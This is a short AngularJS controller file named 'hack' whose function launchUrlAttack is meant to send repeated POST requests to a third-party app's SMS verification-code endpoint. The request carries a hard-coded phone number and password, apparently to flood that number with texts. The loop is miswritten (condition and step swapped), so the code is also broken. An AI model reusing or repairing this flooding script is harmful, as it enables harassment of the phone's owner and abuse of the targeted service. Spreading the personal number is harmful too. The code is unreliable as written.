/**
 * Created by apple on 7/27/16.
 */
var app = angular.module('hack', []);

var navIndex = 2;

app.controller('hackCtrl', function($scope, $http) {
    //端口重复请求
    $scope.url = 'yema.leanapp.cn/user/getSmsCode';
    $scope.times = 1;
    $scope.type = 'post';
    $scope.data = {'mobile': '+8615052445672', 'password': '123456'}
    $scope.results = undefined;
    $scope.launchUrlAttack = function(){
        if ($scope.type == 'post'){
            console.log('tried');
            for (var i = 0; i++; i < $scope.times){
                $http.post($scope.url, $scope.data).success(function(response){
                    console.log("returned");
                    $scope.results = response;
                })
            }
        }
    }
})